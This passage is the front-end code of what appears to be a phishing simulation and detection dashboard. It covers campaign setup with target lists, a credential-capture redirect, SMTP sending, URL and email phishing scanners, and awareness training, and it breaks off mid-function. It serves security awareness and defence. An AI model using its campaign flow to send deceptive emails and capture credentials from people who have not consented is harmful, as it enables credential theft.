        <div class="card-head"><div class="card-title"><span class="dot"></span>All Campaigns</div><div class="card-meta" id="camp-count">0 total</div></div>
        <div class="tbl-wrap">
          <table class="tbl">
            <thead><tr><th>ID</th><th>Name</th><th>Template</th><th>Targets</th><th>Sent</th><th>Opened</th><th>Clicked</th><th>Submitted</th><th>Status</th><th>Actions</th></tr></thead>
            <tbody id="camp-body"></tbody>
          </table>
        </div>
      </div>
    </div>

    <!-- ════ NEW CAMPAIGN ════ -->
    <div class="pg" id="pg-new-campaign">
      <div class="ph">
        <div class="ph-left"><div class="pt">Create Campaign</div><div class="ps">Configure a new phishing simulation</div></div>
      </div>
      <div class="g2">
        <div>
          <div class="card">
            <div class="card-head"><div class="card-title"><span class="dot"></span>Campaign Details</div></div>
            <div style="padding:18px">
              <div class="field"><label>Campaign Name *</label><input class="inp" id="nc-name" placeholder="e.g. Q1 2025 Password Reset Test"></div>
              <div class="field"><label>Email Subject *</label><input class="inp" id="nc-subject" placeholder="e.g. Action Required: Verify your account"></div>
              <div class="field"><label>Sender Display Name</label><input class="inp" id="nc-sender-name" value="IT Security" placeholder="IT Security"></div>
              <div class="field"><label>Sender Email</label><input class="inp" id="nc-sender-email" value="security@corp.internal" placeholder="security@corp.internal"></div>
              <div class="field"><label>Redirect URL (after credential capture)</label><input class="inp" id="nc-redirect" value="https://google.com" placeholder="https://..."></div>
              <div class="field"><label>Notes</label><textarea class="inp" id="nc-notes" placeholder="Optional notes..."></textarea></div>
            </div>
          </div>
          <div class="card">
            <div class="card-head"><div class="card-title"><span class="dot" style="background:var(--blue)"></span>Add Targets</div><div class="card-meta">CSV format</div></div>
            <div style="padding:18px">
              <div class="field"><label>Paste targets (one per line: email,FirstName,LastName,Department)</label>
                <textarea class="inp" id="nc-targets" style="min-height:120px;font-family:var(--m);font-size:.75rem" placeholder="alice@company.com,Alice,Smith,Engineering&#10;bob@company.com,Bob,Jones,Finance&#10;carol@company.com,Carol,Brown,HR"></textarea>
              </div>
              <button class="btn btn-outline btn-sm" onclick="parseTargetPreview()">👁 Preview Targets</button>
              <div id="target-preview" style="margin-top:12px"></div>
            </div>
          </div>
        </div>
        <div>
          <div class="card">
            <div class="card-head"><div class="card-title"><span class="dot" style="background:var(--violet)"></span>Email Template</div></div>
            <div class="tmpl-grid" id="tmpl-grid"></div>
          </div>
          <div class="card" id="tmpl-preview-card" style="display:none">
            <div class="card-head"><div class="card-title"><span class="dot" style="background:var(--amber)"></span>Template Preview</div><button class="btn btn-outline btn-sm" onclick="openPreview()">Open Full Preview</button></div>
            <iframe id="tmpl-iframe" style="width:100%;height:280px;border:none;background:#fff;border-radius:0 0 8px 8px"></iframe>
          </div>
          <div style="display:flex;gap:8px;margin-top:4px">
            <button class="btn btn-primary" style="flex:1" onclick="createCampaign()">✅ Create Campaign</button>
          </div>
        </div>
      </div>
    </div>

    <!-- ════ CAMPAIGN DETAIL ════ -->
    <div class="pg" id="pg-campaign-detail">
      <div class="ph">
        <div class="ph-left"><div class="pt" id="detail-title">Campaign Detail</div><div class="ps" id="detail-sub">—</div></div>
        <div class="ph-right" id="detail-actions"></div>
      </div>
      <div class="g3" style="margin-bottom:14px">
        <div class="sc" style="--c:var(--blue)">  <div class="sc-label">Targets</div>  <div class="sc-val" id="d-targets">0</div></div>
        <div class="sc" style="--c:var(--amber)"> <div class="sc-label">Clicked</div>  <div class="sc-val" id="d-clicked">0</div><div class="sc-sub" id="d-click-r">0%</div></div>
        <div class="sc" style="--c:var(--red)">   <div class="sc-label">Submitted</div><div class="sc-val" id="d-submitted">0</div><div class="sc-sub" id="d-sub-r">0%</div></div>
      </div>
      <div class="g2">
        <div class="card">
          <div class="card-head"><div class="card-title"><span class="dot"></span>Target Status</div><div id="detail-export" style="display:flex;gap:6px"></div></div>
          <div class="tbl-wrap" style="max-height:320px;overflow-y:auto">
            <table class="tbl"><thead><tr><th>Email</th><th>Name</th><th>Dept</th><th>Status</th></tr></thead>
            <tbody id="d-targets-body"></tbody></table>
          </div>
        </div>
        <div class="card">
          <div class="card-head"><div class="card-title"><span class="dot" style="background:var(--red)"></span>Event Timeline</div></div>
          <div class="ev-feed" id="d-events"></div>
        </div>
      </div>
    </div>

    <!-- ════ URL ANALYZER ════ -->
    <div class="pg" id="pg-analyzer">
      <div class="ph"><div class="ph-left"><div class="pt">URL Analyzer</div><div class="ps">Scan URLs for phishing indicators using heuristic detection</div></div></div>
      <div class="g2">
        <div>
          <div class="card">
            <div class="card-head"><div class="card-title"><span class="dot"></span>Scan a URL</div></div>
            <div style="padding:18px">
              <div class="field"><label>Enter URL to analyze</label><input class="inp" id="url-input" placeholder="https://example.com/login" onkeydown="if(event.key==='Enter')scanURL()"></div>
              <button class="btn btn-primary" onclick="scanURL()">🔍 Analyze URL</button>
              <div class="field" style="margin-top:14px"><label>Quick examples (click to test)</label>
                <div style="display:flex;flex-wrap:wrap;gap:6px;margin-top:6px">
                  <button class="btn btn-outline btn-sm" onclick="quickURL('http://paypa1.com/login?user=test')">Typosquat</button>
                  <button class="btn btn-outline btn-sm" onclick="quickURL('http://secure-account.microsoft.com.phishing.xyz/verify')">Subdomain abuse</button>
                  <button class="btn btn-outline btn-sm" onclick="quickURL('http://bit.ly/3xK9pQ')">URL shortener</button>
                  <button class="btn btn-outline btn-sm" onclick="quickURL('http://192.168.1.1/admin/password-reset')">IP domain</button>
                  <button class="btn btn-outline btn-sm" onclick="quickURL('https://google.com/search?q=hello')">Legitimate</button>
                </div>
              </div>
            </div>
          </div>
          <div class="card" id="url-result-card" style="display:none">
            <div class="card-head"><div class="card-title"><span class="dot" style="background:var(--red)"></span>Analysis Result</div><div class="card-meta" id="url-result-url"></div></div>
            <div style="padding:18px;display:flex;gap:20px;align-items:flex-start">
              <div style="text-align:center;flex-shrink:0">
                <div class="risk-ring">
                  <svg viewBox="0 0 120 120" width="120" height="120">
                    <circle cx="60" cy="60" r="50" fill="none" stroke="#1d2333" stroke-width="12"/>
                    <circle cx="60" cy="60" r="50" fill="none" stroke-width="12" stroke-linecap="round"
                            id="url-ring" stroke-dasharray="314 314" stroke-dashoffset="314"/>
                  </svg>
                  <div class="risk-label"><div class="risk-num" id="url-score">0</div><div class="risk-txt" id="url-level">Safe</div></div>
                </div>
              </div>
              <div style="flex:1">
                <div style="font-size:.75rem;color:var(--t2);margin-bottom:10px;font-weight:600">DETECTED INDICATORS</div>
                <div id="url-indicators"></div>
                <div id="url-no-indicators" style="color:var(--t3);font-size:.8rem;padding:8px 0;display:none">✅ No phishing indicators found</div>
              </div>
            </div>
          </div>
        </div>
        <div>
          <div class="card">
            <div class="card-head"><div class="card-title"><span class="dot" style="background:var(--violet)"></span>Recent Scans</div></div>
            <div class="tbl-wrap" style="max-height:400px;overflow-y:auto">
              <table class="tbl">
                <thead><tr><th>URL</th><th>Score</th><th>Risk</th><th>Time</th></tr></thead>
                <tbody id="url-history"></tbody>
              </table>
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- ════ EMAIL SCANNER ════ -->
    <div class="pg" id="pg-email-scan">
      <div class="ph"><div class="ph-left"><div class="pt">Email Phishing Scanner</div><div class="ps">Analyze email headers and body for phishing indicators</div></div></div>
      <div class="g2">
        <div>
          <div class="card">
            <div class="card-head"><div class="card-title"><span class="dot"></span>Paste Email Content</div></div>
            <div style="padding:18px">
              <div class="field">
                <label>Email Headers (optional but improves accuracy)</label>
                <textarea class="inp" id="email-headers" style="min-height:100px;font-family:var(--m);font-size:.72rem" placeholder="From: support@paypa1.com&#10;Reply-To: hacker@evil.com&#10;Received-SPF: fail&#10;DKIM-Signature: ..."></textarea>
              </div>
              <div class="field">
                <label>Email Body / HTML *</label>
                <textarea class="inp" id="email-body" style="min-height:140px;font-family:var(--m);font-size:.72rem" placeholder="Paste email HTML or plain text body here..."></textarea>
              </div>
              <div style="display:flex;gap:8px;flex-wrap:wrap">
                <button class="btn btn-primary" onclick="scanEmail()">🔍 Analyze Email</button>
                <button class="btn btn-outline btn-sm" onclick="loadEmailSample('spf_fail')">Load SPF Fail Sample</button>
                <button class="btn btn-outline btn-sm" onclick="loadEmailSample('cred_form')">Load Cred Form Sample</button>
              </div>
            </div>
          </div>
        </div>
        <div>
          <div class="card" id="email-result-card" style="display:none">
            <div class="card-head"><div class="card-title"><span class="dot" style="background:var(--red)"></span>Email Analysis Result</div></div>
            <div style="padding:18px">
              <div style="display:flex;gap:20px;align-items:flex-start;margin-bottom:16px">
                <div class="risk-ring" style="width:100px;height:100px">
                  <svg viewBox="0 0 120 120" width="100" height="100">
                    <circle cx="60" cy="60" r="50" fill="none" stroke="#1d2333" stroke-width="12"/>
                    <circle cx="60" cy="60" r="50" fill="none" stroke-width="12" stroke-linecap="round"
                            id="email-ring" stroke-dasharray="314 314" stroke-dashoffset="314"/>
                  </svg>
                  <div class="risk-label"><div class="risk-num" id="email-score">0</div><div class="risk-txt" id="email-level">Safe</div></div>
                </div>
                <div style="flex:1">
                  <div style="font-size:1rem;font-weight:700;margin-bottom:4px" id="email-verdict">—</div>
                  <div style="font-size:.78rem;color:var(--t2)" id="email-summary">Analyzing...</div>
                </div>
              </div>
              <div style="font-size:.72rem;color:var(--t2);margin-bottom:8px;font-weight:600;text-transform:uppercase;letter-spacing:.8px">Indicators</div>
              <div id="email-indicators"></div>
            </div>
          </div>
          <div class="card">
            <div class="card-head"><div class="card-title"><span class="dot" style="background:var(--violet)"></span>Detection Rules Reference</div></div>
            <div style="padding:14px">
              <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;font-size:.74rem">
                <div style="background:var(--s3);border-radius:6px;padding:10px"><div style="font-weight:600;color:var(--orange);margin-bottom:4px">SPF/DKIM</div><div style="color:var(--t2)">Authentication header validation</div></div>
                <div style="background:var(--s3);border-radius:6px;padding:10px"><div style="font-weight:600;color:var(--red);margin-bottom:4px">Reply-To Mismatch</div><div style="color:var(--t2)">Sender vs reply domain differs</div></div>
                <div style="background:var(--s3);border-radius:6px;padding:10px"><div style="font-weight:600;color:var(--amber);margin-bottom:4px">Urgency Language</div><div style="color:var(--t2)">Pressure/fear-inducing keywords</div></div>
                <div style="background:var(--s3);border-radius:6px;padding:10px"><div style="font-weight:600;color:var(--violet);margin-bottom:4px">Embedded Forms</div><div style="color:var(--t2)">HTML forms requesting credentials</div></div>
                <div style="background:var(--s3);border-radius:6px;padding:10px"><div style="font-weight:600;color:var(--cyan);margin-bottom:4px">Suspicious URLs</div><div style="color:var(--t2)">Links with phishing patterns</div></div>
                <div style="background:var(--s3);border-radius:6px;padding:10px"><div style="font-weight:600;color:var(--pink);margin-bottom:4px">Attachments</div><div style="color:var(--t2)">Dangerous file extensions</div></div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- ════ EVENTS ════ -->
    <div class="pg" id="pg-events">
      <div class="ph"><div class="ph-left"><div class="pt">Live Events</div><div class="ps">Real-time tracking events across all campaigns</div></div></div>
      <div class="card">
        <div class="card-head"><div class="card-title"><span class="dot" style="background:var(--red)"></span>All Events</div><div class="card-meta" id="ev-count">—</div></div>
        <div class="tbl-wrap">
          <table class="tbl">
            <thead><tr><th>Time</th><th>Event</th><th>Campaign</th><th>Target</th><th>IP Address</th><th>User Agent</th></tr></thead>
            <tbody id="ev-body"></tbody>
          </table>
        </div>
      </div>
    </div>

    <!-- ════ AWARENESS ════ -->
    <div class="pg" id="pg-awareness">
      <div class="ph"><div class="ph-left"><div class="pt">Security Awareness</div><div class="ps">Training materials and phishing recognition guide</div></div></div>
      <div class="g2">
        <div class="card">
          <div class="card-head"><div class="card-title"><span class="dot" style="background:var(--green)"></span>How to Spot Phishing</div></div>
          <div style="padding:18px;display:flex;flex-direction:column;gap:10px">
            <div style="background:var(--s3);border-radius:7px;padding:14px;border-left:3px solid var(--red)">
              <div style="font-weight:700;font-size:.82rem;margin-bottom:5px">🔗 Check the URL Carefully</div>
              <div style="font-size:.75rem;color:var(--t2)">Look at the address bar. Attackers use domains like <span style="font-family:var(--m);color:var(--orange)">paypa1.com</span> or <span style="font-family:var(--m);color:var(--orange)">login.microsoft.com.evil.xyz</span> — always verify the real domain.</div>
            </div>
            <div style="background:var(--s3);border-radius:7px;padding:14px;border-left:3px solid var(--amber)">
              <div style="font-weight:700;font-size:.82rem;margin-bottom:5px">⚠ Urgency is a Red Flag</div>
              <div style="font-size:.75rem;color:var(--t2)">Phrases like "your account will be locked in 24 hours" are designed to make you act without thinking. Slow down and verify.</div>
            </div>
            <div style="background:var(--s3);border-radius:7px;padding:14px;border-left:3px solid var(--blue)">
              <div style="font-weight:700;font-size:.82rem;margin-bottom:5px">🔒 HTTPS ≠ Safe</div>
              <div style="font-size:.75rem;color:var(--t2)">The padlock icon only means the connection is encrypted — it does NOT mean the site is legitimate. Phishing sites often use HTTPS too.</div>
            </div>
            <div style="background:var(--s3);border-radius:7px;padding:14px;border-left:3px solid var(--violet)">
              <div style="font-weight:700;font-size:.82rem;margin-bottom:5px">📧 Never Click Email Links</div>
              <div style="font-size:.75rem;color:var(--t2)">Go directly to the website by typing the URL or using a bookmark. Never click links in unexpected emails asking you to sign in.</div>
            </div>
            <div style="background:var(--s3);border-radius:7px;padding:14px;border-left:3px solid var(--green)">
              <div style="font-weight:700;font-size:.82rem;margin-bottom:5px">🛡 Use MFA Everywhere</div>
              <div style="font-size:.75rem;color:var(--t2)">Multi-factor authentication means even if attackers steal your password, they still can't access your account without your second factor.</div>
            </div>
          </div>
        </div>
        <div>
          <div class="card">
            <div class="card-head"><div class="card-title"><span class="dot" style="background:var(--orange)"></span>Phishing Attack Types</div></div>
            <div style="padding:14px">
              <table class="tbl"><thead><tr><th>Type</th><th>Description</th><th>Risk</th></tr></thead><tbody>
                <tr><td style="font-weight:600">Spear Phishing</td><td style="font-size:.72rem;color:var(--t2)">Targeted attack using personalized info</td><td><span class="tag" style="background:rgba(239,68,68,.1);color:var(--red);border:1px solid rgba(239,68,68,.2)">Critical</span></td></tr>
                <tr><td style="font-weight:600">Whaling</td><td style="font-size:.72rem;color:var(--t2)">C-suite executives targeted</td><td><span class="tag" style="background:rgba(239,68,68,.1);color:var(--red);border:1px solid rgba(239,68,68,.2)">Critical</span></td></tr>
                <tr><td style="font-weight:600">Vishing</td><td style="font-size:.72rem;color:var(--t2)">Voice phishing via phone calls</td><td><span class="tag" style="background:rgba(249,115,22,.1);color:var(--orange);border:1px solid rgba(249,115,22,.2)">High</span></td></tr>
                <tr><td style="font-weight:600">Smishing</td><td style="font-size:.72rem;color:var(--t2)">SMS-based phishing attacks</td><td><span class="tag" style="background:rgba(249,115,22,.1);color:var(--orange);border:1px solid rgba(249,115,22,.2)">High</span></td></tr>
                <tr><td style="font-weight:600">Clone Phishing</td><td style="font-size:.72rem;color:var(--t2)">Duplicate of a legitimate email</td><td><span class="tag" style="background:rgba(245,158,11,.1);color:var(--amber);border:1px solid rgba(245,158,11,.2)">Medium</span></td></tr>
                <tr><td style="font-weight:600">Pharming</td><td style="font-size:.72rem;color:var(--t2)">DNS poisoning to redirect traffic</td><td><span class="tag" style="background:rgba(239,68,68,.1);color:var(--red);border:1px solid rgba(239,68,68,.2)">Critical</span></td></tr>
              </tbody></table>
            </div>
          </div>
          <div class="card" style="margin-top:14px">
            <div class="card-head"><div class="card-title"><span class="dot" style="background:var(--cyan)"></span>Quick Test: Is this phishing?</div></div>
            <div style="padding:16px">
              <div id="quiz-container"></div>
              <button class="btn btn-primary btn-sm" style="margin-top:10px" onclick="nextQuiz()">Next Question →</button>
            </div>
          </div>
        </div>
      </div>
    </div>

  </main>
</div>

<!-- LAUNCH MODAL -->
<div class="modal-bg hidden" id="launch-modal">
  <div class="modal">
    <div class="modal-head"><div class="modal-title">🚀 Launch Campaign</div><button class="modal-close" onclick="closeLaunchModal()">✕</button></div>
    <div class="modal-body">
      <p style="font-size:.82rem;color:var(--t2);margin-bottom:16px">Configure SMTP to send real emails, or use <strong style="color:var(--orange)">Simulated Mode</strong> (logs events without sending).</p>
      <div class="field">
        <label><input type="checkbox" id="use-smtp" onchange="toggleSmtp()"> Use real SMTP server</label>
      </div>
      <div id="smtp-fields" style="display:none">
        <div class="g2">
          <div class="field"><label>SMTP Host</label><input class="inp" id="smtp-host" placeholder="smtp.gmail.com"></div>
          <div class="field"><label>Port</label><input class="inp" id="smtp-port" value="587" placeholder="587"></div>
        </div>
        <div class="field"><label>Username</label><input class="inp" id="smtp-user" placeholder="user@gmail.com"></div>
        <div class="field"><label>Password / App Password</label><input class="inp" type="password" id="smtp-pass" placeholder="••••••••"></div>
        <div class="field"><label><input type="checkbox" id="smtp-tls" checked> Use TLS (STARTTLS)</label></div>
      </div>
      <div style="background:rgba(249,115,22,.08);border:1px solid rgba(249,115,22,.2);border-radius:7px;padding:12px;font-size:.75rem;color:var(--amber);margin-top:8px">
        ⚠ Only send to targets who have given informed consent. Unauthorized phishing simulation is illegal.
      </div>
    </div>
    <div class="modal-foot">
      <button class="btn btn-outline" onclick="closeLaunchModal()">Cancel</button>
      <button class="btn btn-primary" onclick="launchCampaign()">🚀 Launch</button>
    </div>
  </div>
</div>

<div id="toast"></div>

<script>
// ── State ──────────────────────────────────────────────────────────────────
let currentCampaignId = null;
let selectedTemplate  = null;
let funnelChart       = null;
let templates         = {};

// ── Clock ──────────────────────────────────────────────────────────────────
setInterval(()=>document.getElementById('clk').textContent=new Date().toLocaleTimeString('en-US',{hour12:false}),1000);
document.getElementById('clk').textContent=new Date().toLocaleTimeString('en-US',{hour12:false});

const $ = id => document.getElementById(id);
const esc = s => String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');

// ── Toast ──────────────────────────────────────────────────────────────────
function toast(msg, dur=3000){
  const el=$('toast'); el.textContent=msg;
  el.classList.add('show');
  setTimeout(()=>el.classList.remove('show'), dur);
}

// ── Navigation ─────────────────────────────────────────────────────────────
function nav(page){
  document.querySelectorAll('.pg').forEach(p=>p.classList.remove('on'));
  document.querySelectorAll('.nt[data-pg], .sb-item[data-pg]').forEach(b=>{
    b.classList.toggle('on', b.dataset.pg===page);
  });
  const el=$('pg-'+page);
  if(el){ el.classList.add('on'); $('main').scrollTo(0,0); }
  if(page==='dashboard')      refreshDashboard();
  if(page==='campaigns')      loadCampaigns();
  if(page==='new-campaign')   loadTemplates();
  if(page==='analyzer')       loadURLHistory();
  if(page==='events')         loadAllEvents();
}

// ── Counter animation ──────────────────────────────────────────────────────
function animN(el, target){
  if(!el) return;
  const cur=parseInt(el.textContent.replace(/[^0-9]/g,''))||0;
  if(cur===target) return;
  const steps=16; let n=0; const inc=(target-cur)/steps; let v=cur;
  const t=setInterval(()=>{n++;v+=inc;el.textContent=Math.round(n<steps?v:target).toLocaleString();if(n>=steps)clearInterval(t)},28);
}

// ── Tag helpers ────────────────────────────────────────────────────────────
function statusTag(s){return`<span class="tag tag-${s}">${s}</span>`}
function riskColor(score){ return score>=80?'#ef4444':score>=55?'#f97316':score>=30?'#f59e0b':'#22c55e' }
function riskBg(score){ return score>=80?'rgba(239,68,68,.1)':score>=55?'rgba(249,115,22,.1)':score>=30?'rgba(245,158,11,.1)':'rgba(34,197,94,.1)' }

// ── Dashboard ──────────────────────────────────────────────────────────────
async function refreshDashboard(){
  const [stats, camps] = await Promise.all([
    fetch('/api/stats').then(r=>r.json()),
    fetch('/api/campaigns').then(r=>r.json())
  ]);

  animN($('v-campaigns'), stats.campaigns);
  animN($('v-sent'), stats.sent);
  $('v-active').textContent = stats.active+' active';
  $('v-crate').textContent  = stats.click_rate+'%';
  $('v-srate').textContent  = stats.submit_rate+'%';
  $('v-clicked').textContent   = stats.clicked+' clicked';
  $('v-submitted').textContent = stats.submitted+' submitted';
  $('sb-campaigns').textContent = stats.campaigns;
  $('sb-events').textContent    = stats.recent_events.length;

  // Dash campaign table
  $('dash-campaigns').innerHTML = camps.slice(0,5).map(c=>{
    const rate = c.total_targets ? Math.round((c.clicked||0)/c.total_targets*100) : 0;
    return `<tr>
      <td style="font-weight:500">${esc(c.name)}</td>
      <td class="mono">${c.total_targets||0}</td>
      <td>
        <div style="display:flex;align-items:center;gap:8px">
          <div class="prog" style="width:60px"><div class="prog-fill" style="width:${rate}%;background:${riskColor(rate)}"></div></div>
          <span class="mono" style="font-size:.68rem;color:var(--t2)">${rate}%</span>
        </div>
      </td>
      <td>${statusTag(c.status)}</td>
    </tr>`;
  }).join('') || '<tr><td colspan="4"><div class="empty"><div class="eico">📧</div><div class="etxt">No campaigns yet</div></div></td></tr>';

  // Event feed
  $('dash-events').innerHTML = stats.recent_events.slice(0,15).map(e=>`
    <div class="ev-row">
      <span class="ev-type type-${e.event_type}">${e.event_type}</span>
      <span style="font-size:.72rem;color:var(--t1);flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${e.data?esc(e.data.slice(0,40)):''}</span>
      <span class="ev-ip">${e.ip_address||'—'}</span>
      <span class="ev-ts">${e.timestamp.replace('T',' ').slice(11,19)}</span>
    </div>`).join('') || '<div class="empty"><div class="eico">⚡</div><div class="etxt">No events yet</div></div>';
  $('dash-ev-count').textContent = stats.recent_events.length + ' events';

  // Funnel chart
  buildFunnel(stats);
}

function buildFunnel(stats){
  const ctx=$('funnel-chart').getContext('2d');
  if(funnelChart) funnelChart.destroy();
  funnelChart = new Chart(ctx, {
    type:'bar',
    data:{
      labels:['Sent','Opened','Clicked','Submitted'],
      datasets:[{
        data:[stats.sent, Math.round(stats.sent*.35), stats.clicked, stats.submitted],
        backgroundColor:['rgba(59,130,246,.6)','rgba(245,158,11,.6)','rgba(249,115,22,.7)','rgba(239,68,68,.7)'],
        borderRadius:4, borderSkipped:false
      }]
    },
    options:{
      responsive:true,maintainAspectRatio:false,
      scales:{
        x:{ticks:{color:'#475569',font:{family:'DM Sans'}},grid:{display:false}},
        y:{ticks:{color:'#475569',font:{family:'Fira Code',size:10}},grid:{color:'rgba(255,255,255,.04)'}}
      },
      plugins:{legend:{display:false},tooltip:{
        backgroundColor:'#1d2333',borderColor:'rgba(255,255,255,.08)',borderWidth:1,
        titleColor:'#f8fafc',bodyColor:'#94a3b8',
        titleFont:{family:'DM Sans',weight:'700'},bodyFont:{family:'Fira Code'}
      }}
    }
  });
}

// ── Campaigns ──────────────────────────────────────────────────────────────
async function loadCampaigns(){
  const camps = await fetch('/api/campaigns').then(r=>r.json());
  $('camp-count').textContent = camps.length+' total';
  $('camp-body').innerHTML = camps.map(c=>{
    const rate = c.total_targets ? Math.round((c.clicked||0)/c.total_targets*100) : 0;
    return `<tr>
      <td class="mono" style="color:var(--t3)">#${c.id}</td>
      <td><span style="font-weight:500;cursor:pointer;color:var(--orange)" onclick="viewCampaign(${c.id})">${esc(c.name)}</span></td>
      <td style="font-size:.72rem;color:var(--t2)">${esc(c.template_id)}</td>
      <td class="mono">${c.total_targets||0}</td>
      <td class="mono">${c.total_targets||0}</td>
      <td class="mono">${c.opened||0}</td>
      <td class="mono" style="color:var(--amber)">${c.clicked||0}</td>
      <td class="mono" style="color:var(--red)">${c.submitted||0}</td>
      <td>${statusTag(c.status)}</td>
      <td>
        <div style="display:flex;gap:4px">
          <button class="btn btn-outline btn-sm" onclick="viewCampaign(${c.id})">View</button>
          <button class="btn btn-danger btn-sm" onclick="deleteCampaign(${c.id})">Del</button>
        </div>
      </td>
    </tr>`;
  }).join('') || '<tr><td colspan="10"><div class="empty"><div class="eico">📧</div><div class="etxt">No campaigns. Create one!</div></div></td></tr>';
}

// ── New Campaign ───────────────────────────────────────────────────────────
async function loadTemplates(){
  const list = await fetch('/api/templates').then(r=>r.json());
  templates = {};
  list.forEach(t=>templates[t.id]=t);
  $('tmpl-grid').innerHTML = list.map(t=>`
    <div class="tmpl-card" onclick="selectTemplate('${t.id}')" id="tmpl-${t.id}">
      <div class="tmpl-icon">${t.icon}</div>
      <div class="tmpl-name">${t.name}</div>
      <div class="tmpl-cat">${t.category}</div>
    </div>`).join('');
}

function selectTemplate(id){
  document.querySelectorAll('.tmpl-card').forEach(c=>c.classList.remove('sel'));
  const card = $('tmpl-'+id);
  if(card) card.classList.add('sel');
  selectedTemplate = id;
  const t = templates[id];
  if(t){
    $('nc-subject').value = t.subject;
    $('tmpl-preview-card').style.display='block';
    $('tmpl-iframe').src = 'about:blank';
    // tiny delay so iframe resets
    setTimeout(()=>{ $('tmpl-iframe').src = '/api/campaigns/0/preview?tmpl='+id; },50);
  }
}

// Quick preview override
app_preview_tmpl = null;
const origPreview = window.onload;

function openPreview(){
  if(!selectedTemplate) return;
  window.open('/api/campaigns/0/preview?tmpl='+selectedTemplate, '_blank');
}

function parseTargetPreview(){
  const lines = $('nc-targets').value.trim().split('\n').filter(Boolean);
  if(!lines.length){ toast('No targets entered'); return; }
  const rows = lines.map(l=>{
    const [email='',first_name='',last_name='',department=''] = l.split(',');
    return {email:email.trim(),first_name:first_name.trim(),last_name:last_name.trim(),department:department.trim()};
  }).filter(r=>r.email);
  $('target-preview').innerHTML = `
    <div style="font-size:.72rem;color:var(--green);margin-bottom:6px">✅ ${rows.length} target(s) parsed</div>
    <table class="tbl" style="font-size:.7rem">
      <thead><tr><th>Email</th><th>First</th><th>Last</th><th>Dept</th></tr></thead>
      <tbody>${rows.slice(0,5).map(r=>`<tr><td class="mono">${esc(r.email)}</td><td>${esc(r.first_name)}</td><td>${esc(r.last_name)}</td><td>${esc(r.department)}</td></tr>`).join('')}
      ${rows.length>5?`<tr><td colspan="4" style="color:var(--t3);font-size:.68rem">...and ${rows.length-5} more</td></tr>`:''}</tbody>
    </table>`;
}

async function createCampaign(){
  const name = $('nc-name').value.trim();
  const subj = $('nc-subject').value.trim();
  if(!name || !subj){ toast('Campaign name and subject are required'); return; }
  if(!selectedTemplate){ toast('Please select an email template'); return; }

  const res = await fetch('/api/campaigns', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({
      name, template_id: selectedTemplate, subject: subj,
      sender_name:  $('nc-sender-name').value.trim(),
      sender_email: $('nc-sender-email').value.trim(),
      redirect_url: $('nc-redirect').value.trim() || 'https://google.com',
      notes:        $('nc-notes').value.trim(),
    })
  }).then(r=>r.json());

  if(!res.id){ toast('Error creating campaign'); return; }

  // Add targets
  const lines = $('nc-targets').value.trim().split('\n').filter(Boolean);
  if(lines.length){
    const tgts = lines.map(l=>{
      const [email='',first_name='',last_name='',department=''] = l.split(',');
      return {email:email.trim(),first_name:first_name.trim(),last_name:last_name.trim(),department:department.trim()};
    }).filter(r=>r.email);
    await fetch(`/api/campaigns/${res.id}/targets`, {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({targets:tgts})
    });
  }

  toast(`✅ Campaign "${name}" created!`);
  // clear form
  ['nc-name','nc-subject','nc-notes','nc-targets'].forEach(id=>$(id).value='');
  $('nc-sender-name').value='IT Security';
  $('nc-sender-email').value='security@corp.internal';
  $('nc-redirect').value='https://google.com';
  selectedTemplate=null;
  document.querySelectorAll('.tmpl-card').forEach(c=>c.classList.remove('sel'));
  $('tmpl-preview-card').style.display='none';
  $('target-preview').innerHTML='';

  viewCampaign(res.id);
}

// ── Campaign Detail ─────────────────────────────────────────────────────────
async function viewCampaign(id){
  currentCampaignId = id;
  nav('campaign-detail');
  const d = await fetch(`/api/campaigns/${id}`).then(r=>r.json());
  const c = d.campaign;
  $('detail-title').textContent = c.name;
  $('detail-sub').textContent   = `Template: ${c.template_id} · Created: ${c.created_at.slice(0,10)} · Status: ${c.status}`;

  const sent      = d.targets.filter(t=>t.status!=='pending').length;
  const clicked   = d.targets.filter(t=>['clicked','submitted'].includes(t.status)).length;
  const submitted = d.targets.filter(t=>t.status==='submitted').length;

  animN($('d-targets'),   d.targets.length);
  animN($('d-clicked'),   clicked);
  animN($('d-submitted'), submitted);
  $('d-click-r').textContent = sent ? Math.round(clicked/sent*100)+'% click rate' : '—';
  $('d-sub-r').textContent   = sent ? Math.round(submitted/sent*100)+'% cred rate' : '—';

  $('detail-actions').innerHTML = `
    <button class="btn btn-green" onclick="openLaunchModal(${id})">🚀 Launch</button>
    <button class="btn btn-outline" onclick="window.open('/api/export/${id}')">⬇ Export CSV</button>
    <button class="btn btn-outline" onclick="window.open('/api/campaigns/${id}/preview','_blank')">👁 Preview</button>`;

  $('d-targets-body').innerHTML = d.targets.map(t=>`
    <tr>
      <td class="mono" style="color:var(--cyan)">${esc(t.email)}</td>
      <td>${esc(t.first_name+' '+t.last_name).trim()||'—'}</td>
      <td style="font-size:.72rem;color:var(--t2)">${esc(t.department)||'—'}</td>
      <td>${statusTag(t.status)}</td>
    </tr>`).join('');

  $('d-events').innerHTML = d.events.map(e=>`
    <div class="ev-row">
      <span class="ev-type type-${e.event_type}">${e.event_type}</span>
      <span style="font-size:.7rem;color:var(--t1);flex:1">${e.ip_address||'—'}</span>
      <span class="ev-ts">${e.timestamp.replace('T',' ').slice(11,19)}</span>
    </div>`).join('') || '<div class="empty"><div class="eico">⚡</div><div class="etxt">No events yet — launch campaign</div></div>';
}

async function deleteCampaign(id){
  if(!confirm('Delete this campaign and all its data?')) return;
  await fetch(`/api/campaigns/${id}`, {method:'DELETE'});
  toast('Campaign deleted');
  loadCampaigns();
}

// ── Launch modal ───────────────────────────────────────────────────────────
function openLaunchModal(id){ currentCampaignId=id; $('launch-modal').classList.remove('hidden'); }
function closeLaunchModal(){ $('launch-modal').classList.add('hidden'); }
function toggleSmtp(){ $('smtp-fields').style.display=$('use-smtp').checked?'block':'none'; }

async function launchCampaign(){
  if(!currentCampaignId){ toast('No campaign selected'); return; }
  const useSmtp = $('use-smtp').checked;
  const body = {use_smtp: useSmtp};
  if(useSmtp){
    body.host=$('smtp-host').value; body.port=$('smtp-port').value;
